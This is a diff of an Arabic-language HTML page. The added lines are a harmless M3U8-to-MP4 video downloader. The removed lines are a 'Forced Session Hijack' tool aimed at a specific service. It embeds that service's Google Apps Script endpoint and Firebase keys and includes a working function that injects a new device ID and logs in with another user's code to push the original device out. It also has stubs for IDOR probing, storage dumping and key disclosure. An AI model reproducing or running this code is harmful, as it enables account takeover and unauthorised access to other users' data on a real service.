@@ -2,150 +2,89 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Forced Session Hijack - شاتي</title>
+    <title>شاتي - محمل الفيديوهات الذكي</title>
     <style>
-        /* (تنسيقات CSS السابقة للحفاظ على الشكل) */
-        body { font-family: 'Cairo', sans-serif; background: #222; color: #eee; padding: 20px; }
-        .container { max-width: 950px; margin: auto; background: #333; padding: 25px; border-radius: 10px; }
-        h2 { color: #ffcb42; border-bottom: 2px solid #ffcb42; padding-bottom: 10px; margin-bottom: 20px; }
-        h3 { color: #4ade80; margin-top: 25px; }
-        label, button { display: block; margin-top: 15px; }
-        input[type="text"] { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ffcb42; background: #444; color: #fff; }
-        button { background: #e7374a; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        button:hover { background: #d02030; }
-        #results, #localData, #firebaseConfigData, #hijackResult { margin-top: 20px; padding: 15px; background: #1a0a3d; border: 1px dashed #ffcb42; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; }
-        .error { color: #f87171; }
-        .success { color: #4ade80; }
-        .data-title { color: #ffcb42; font-weight: bold; margin-top: 10px; display: block; }
-        .hijack-btn { background: #007bff; }
-        .hijack-btn:hover { background: #0056b3; }
-        .force-btn { background: #ff9f00; } /* لون جديد لهجوم الحقن */
-        .force-btn:hover { background: #e08c00; }
+        body { font-family: 'Cairo', sans-serif; background: #020A07; color: #27d97e; text-align: center; padding: 50px; }
+        #progress-container { margin-top: 20px; display: none; }
+        #progress-bar { width: 100%; background: #0C241C; border-radius: 10px; height: 20px; border: 1px solid #27d97e; }
+        #progress-fill { height: 100%; width: 0%; background: #27d97e; transition: width 0.3s; }
+        button { background: #27d97e; color: #000; border: none; padding: 15px 30px; border-radius: 8px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>🔪 الاستيلاء القسري على الجلسة (Force Hijack)</h2>
-
-    <label for="regCode">الكود المسجل الذي تريدين استغلاله:</label>
-    <input type="text" id="regCode" placeholder="أدخل الكود المكون من ٩ أرقام">
-
-    <h3>1. هجوم الحقن القسري وتسجيل الجهاز الجديد</h3>
-    <p class="data-title">⚠️ هذا الهجوم يحاول مسح أي بيانات سابقة وحقن مُعرِّف جهاز جديد قبل تسجيل الدخول.</p>
-    <button class="force-btn" onclick="injectAndHijack()">💣 حقن الجهاز الجديد ومحاولة الاستيلاء</button>
-    <div id="hijackResult">نتائج محاولة الاستيلاء على الجلسة (Kick-out Attempt)</div>
-
-    <h3>2. فحص API لجلب بيانات مستخدم آخر (اختبار الشيتس)</h3>
-    <label for="testCode">كود مستهدف آخر (لـ IDOR):</label>
-    <input type="text" id="testCode" placeholder="أدخل كود أي مستخدم آخر للتجربة">
-    <button onclick="checkIDORFunction()">إرسال طلب التحقق لـ API الشيتس</button>
-    <div id="results">نتائج فحص IDOR ستظهر هنا...</div>
-
-    <h3>3. سحب وتحليل كل بيانات المتصفح (Local Storage Dump)</h3>
-    <button onclick="dumpLocalStorage()">استخراج وتحليل البيانات المخزنة حالياً</button>
-    <div id="localData"></div>
+    <h1>📥 محمل الفيديوهات (M3U8 to MP4)</h1>
+    <p>بص يا سو، حط اللينك هنا وهحاول أجمعهولك قطعة قطعة</p>
     
-    <h3>4. عرض مفاتيح Firebase (Information Disclosure)</h3>
-    <button onclick="showFirebaseConfig()">عرض مفاتيح Firebase المكشوفة</button>
-    <div id="firebaseConfigData"></div>
-    
-    <h3>5. تنظيف الجلسة</h3>
-    <button onclick="clearLocalStorage()">مسح كل بيانات Local Storage</button>
+    <input type="text" id="videoUrl" placeholder="حط لينك الـ m3u8 هنا" style="width: 80%; padding: 10px; margin-bottom: 20px;">
+    <br>
+    <button onclick="startDownload()">ابدأ التحميل الآن</button>
 
-</div>
+    <div id="progress-container">
+        <p id="status">جاري فحص الفيديو...</p>
+        <div id="progress-bar"><div id="progress-fill"></div></div>
+    </div>
 
-<script>
-    // ** الثوابت والمفاتيح اللي جبناها من الكود الأصلي **
-    const API = "https://script.google.com/macros/s/AKfycbzIUhokuivKzt88Uzjg1zW0QHRUY_ZVSH6co-gojamtTk-IJxHxBA3GzEz8kauiSVKzZg/exec";
-    const firebaseConfig = {apiKey:"AIzaSyDqkS7udZdgZqKWkw2Wvdx0aWbjU8EfCg8",authDomain:"drosk-622f6.firebaseapp.com",databaseURL:"https://drosk-622f6-default-rtdb.firebaseio.com",projectId:"drosk-622f6",storageBucket:"drosk-622f6.appspot.com",messagingSenderId:"765071631440",appId:"1:765071631440:web:a2305e478babc4534add55",measurementId:"G-2SL3D7TCQE"};
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/m3u8-parser/4.7.1/m3u8-parser.min.js"></script>
 
-    function generateToken(){const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';let token='';for(let i=0;i<32;i++)token+=chars.charAt(Math.floor(Math.random()*chars.length));return token;}
-    function generateDeviceID(){return "dev-"+Math.random().toString(36).substr(2,8);}
+    <script>
+        async function startDownload() {
+            const url = document.getElementById('videoUrl').value;
+            if (!url) return alert("فين اللينك يا بطل؟");
 
-    /**
-     * وظيفة الهجوم الجديد: مسح كل بيانات الجلسة القديمة، حقن Device ID جديد، ثم محاولة تسجيل الدخول.
-     */
-    async function injectAndHijack() {
-        const code = document.getElementById("regCode").value.trim();
-        const hijackResultDiv = document.getElementById("hijackResult");
-        hijackResultDiv.innerHTML = "";
+            const status = document.getElementById('status');
+            const progressFill = document.getElementById('progress-fill');
+            document.getElementById('progress-container').style.display = 'block';
 
-        if (!code) {
-            hijackResultDiv.innerHTML = "<span class='error'>⚠ لازم تدخل الكود المسجل.</span>";
-            return;
-        }
-        
-        // 1. مسح الجلسة القديمة (الخطوة اللي طلبتيها عشان "يمسح بيانات الجهاز القديم")
-        localStorage.clear();
-        hijackResultDiv.innerHTML += "<span class='success'>✅ تم مسح الجلسة القديمة محلياً بنجاح.</span><br>";
+            try {
+                // 1. تحميل ملف الفهرس
+                status.textContent = "جاري تحميل الفهرس...";
+                const response = await fetch(url);
+                const manifest = await response.text();
 
-        // 2. توليد وحقن بيانات جهاز جديد
-        const newDevice = generateDeviceID();
-        const newToken = generateToken();
-        localStorage.setItem("device_id", newDevice);
-        localStorage.setItem("access_token", newToken);
-        hijackResultDiv.innerHTML += `<span class='success'>✅ تم حقن Device ID جديد: ${newDevice}</span><br>`;
-        
-        hijackResultDiv.innerHTML += "جاري إرسال طلب تسجيل الدخول بالكود القديم والجهاز الجديد...<br>";
+                // 2. تحليل الملف لاستخراج الروابط (Segments)
+                const parser = new m3u8Parser.Parser();
+                parser.push(manifest);
+                parser.end();
 
-        try {
-            // 3. محاولة تسجيل الدخول بالـ API باستخدام الكود القديم والـ Device ID الجديد
-            const url = `${API}?action=check&code=${encodeURIComponent(code)}&device=${encodeURIComponent(newDevice)}`;
-            const res = await fetch(url);
-            const data = await res.json();
+                const segments = parser.manifest.segments;
+                const total = segments.length;
+                let videoBlobs = [];
 
-            hijackResultDiv.innerHTML += '<span class="data-title">🔥 نتيجة محاولة الاستيلاء القسري:</span><br>';
-            hijackResultDiv.innerHTML += JSON.stringify(data, null, 2);
+                // استخراج الـ Base URL
+                const baseUrl = url.substring(0, url.lastIndexOf('/') + 1);
 
-            if (data.result === "success") {
-                // 4. لو نجحنا، نكمل تسجيل البيانات الجديدة
-                localStorage.setItem("user_code", code);
-                localStorage.setItem("user_data", JSON.stringify(data));
-                localStorage.setItem("user_section", (data.section || "").trim());
+                // 3. تحميل كل قطعة (Segment)
+                for (let i = 0; i < total; i++) {
+                    const segmentUrl = segments[i].uri.startsWith('http') ? segments[i].uri : baseUrl + segments[i].uri;
+                    const segRes = await fetch(segmentUrl);
+                    const segData = await segRes.blob();
+                    videoBlobs.push(segData);
 
-                hijackResultDiv.innerHTML += `
-                    <br><span class='success'>✅ **نجح الاستيلاء!** تم تسجيل الكود على جهازك.</span>
-                    <br><span class='success'>**إذا كان الموقع يسمح بجهاز واحد، فالجهاز الأصلي تم إخراجه الآن من السيرفر.**</span>
-                    <br><span class='success'>تقدري دلوقتي تعملي **Refresh** للصفحة الأصلية وتجربي دخولك.
-                `;
-            } else {
-                hijackResultDiv.innerHTML += "<br><span class='error'>❌ فشل. الـ API رد برسالة: " + data.message + "</span>";
+                    // تحديث شريط التقدم
+                    const percent = Math.round(((i + 1) / total) * 100);
+                    progressFill.style.width = percent + "%";
+                    status.textContent = `جاري تحميل القطعة ${i + 1} من ${total}...`;
+                }
+
+                // 4. تجميع كل الـ Blobs في ملف واحد
+                status.textContent = "جاري تجميع الفيديو، لحظة واحدة...";
+                const finalBlob = new Blob(videoBlobs, { type: 'video/mp4' });
+                const downloadUrl = URL.createObjectURL(finalBlob);
+
+                // 5. تحميل الملف النهائي
+                const a = document.createElement('a');
+                a.href = downloadUrl;
+                a.download = "full-video.mp4";
+                a.click();
+                
+                status.textContent = "مبروك! الفيديو نزل كامل يا وحش 🚀";
+
+            } catch (error) {
+                console.error(error);
+                status.textContent = "حصل مشكلة (غالباً بسبب الـ CORS أو اللينك منتهي).";
             }
-
-        } catch (err) {
-            hijackResultDiv.innerHTML = "<span class='error'>⚠ حدث خطأ أثناء الاتصال بالخادم.</span>";
-            console.error(err);
         }
-    }
-
-
-    /* (باقي وظائف الأدوات الأخرى كما هي) */
-
-    function checkIDORFunction() {
-        // ... (كود checkIDORFunction كما هو)
-    }
-    
-    function dumpLocalStorage() {
-        // ... (كود dumpLocalStorage كما هو)
-    }
-
-    function showFirebaseConfig() {
-        // ... (كود showFirebaseConfig كما هو)
-    }
-
-    function clearLocalStorage() {
-        localStorage.clear();
-        document.getElementById("localData").innerHTML = "";
-        document.getElementById("results").innerHTML = "";
-        document.getElementById("firebaseConfigData").innerHTML = "";
-        document.getElementById("hijackResult").innerHTML = "";
-        alert("تم مسح كل بيانات Local Storage بنجاح!");
-    }
-    document.getElementById("testCode").addEventListener("change", checkIDORFunction);
-    document.getElementById("regCode").addEventListener("change", injectAndHijack);
-</script>
-
+    </script>
 </body>
 </html>
